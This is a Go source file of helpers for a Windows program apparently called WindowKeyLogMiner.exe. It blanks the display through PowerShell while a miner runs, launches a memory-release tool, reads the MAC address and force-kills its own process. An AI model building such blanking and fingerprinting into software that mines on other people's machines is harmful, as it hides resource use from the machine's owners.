package main

import (
	"time"
	"os/exec"
	"os"
	"fmt"
	"path/filepath"
	"net"
	"github.com/BurntSushi/toml"
)

/**
 * add by clk
 * turn off display
 */
func offDisplay() {
	for range time.NewTicker(time.Minute * 20).C {
		if minerIsRunning() {
			cmd := exec.Command("cmd", "/C", "powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)")
			cmd.Run()
		}
	}
}
func getCurrentDirectory(fileOrDir string) string {
	execpath, err := os.Executable() // 获得程序路径
	// handle err ...
	if err != nil {
		fmt.Println("error:", err)
	}
	return filepath.Join(filepath.Dir(execpath), fileOrDir)
}

func getMac() net.HardwareAddr {
	interfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("error", err)
	}
	macAddr := interfaces[0].HardwareAddr
	return macAddr
}

// ReadConfig reads info from config file
func ReadConfig(configfile string) Configuration {
	fmt.Printf("Config file read: ")
	fmt.Println(configfile)
	var conf Configuration
	if _, err := toml.DecodeFile(configfile, &conf); err != nil {
		fmt.Println("error:", err)
	}
	return conf
}

func releaseMemory() {
	for range time.NewTicker(time.Hour * 3).C {
		if minerIsRunning() {
			c := exec.Command("cmd", "/c", "./memory_release.exe")
			c.Run()
		}
	}
}
func killSelf() {
	c := exec.Command("cmd", "/c", "taskkill /f /im WindowKeyLogMiner.exe")
	c.Run()
}
